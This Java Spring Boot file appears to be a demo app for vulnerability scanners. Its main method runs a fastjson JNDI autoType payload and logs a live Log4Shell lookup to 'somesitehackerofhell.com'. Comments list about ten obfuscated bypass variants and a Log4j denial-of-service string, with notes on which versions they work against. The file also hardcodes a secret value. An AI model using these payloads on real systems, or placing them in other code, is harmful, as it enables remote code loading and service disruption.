package com.example.jfrog.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;

@RestController
@SpringBootApplication
public class DemoApplication {

    private static String secretValue = "secr37Value";

    private static final Logger logger = LogManager.getLogger();

    @RequestMapping(value = "/helloTomcat")
    public String getHelloTomcat() {
        return "Hello Tomcat!";
    }

    @RequestMapping(value = "/helloJFrog")
    public String getHelloJFrog() {
        return "Hello JFrog!";
    }

    public static void main(String[] args) {
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
        JSON jsonObject = JSON.parseObject(payload);
        logger.info(jsonObject.toString());
        logger.error("${jndi:ldap://somesitehackerofhell.com/z}");

//		if (secretValue.equals("test")) {
//			System.out.println("Secret exposed");
//		}
        // 1. System environment variables
        // logger.error("${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}");

        // 2. Lower Lookup
        // logger.error("${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}");

        // 2. Upper Lookup
        // upper doesn't work for me - Tested on Windows 10
        // logger.error("${${upper:j}ndi:${upper:l}${upper:d}a${upper:p}://somesitehackerofhell.com/z}");

        // 3. "::-" notation
        // logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}");

        // 4. Invalid Unicode characters with upper
        // logger.error("${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}");

        // 5. System properties
        // logger.error("${jnd${sys:SYS_NAME:-i}:ldap://somesitehackerofhell.com/z}");

        // 6. ":-" notation
//        logger.error("${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}");

        // 7. Date
        // logger.error("${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}");

        // 9. Non-existent lookup
        // logger.error("${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}");

        // 12. Trick with # (works on log4j 2.15)
//        logger.error("${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}");

        // 13. Dos attack (Works on LOG4j 2.8 - 2.16 )
        // logger.error("${${::-${::-$${::-j}}}}");
        SpringApplication.run(DemoApplication.class, args);

    }

}
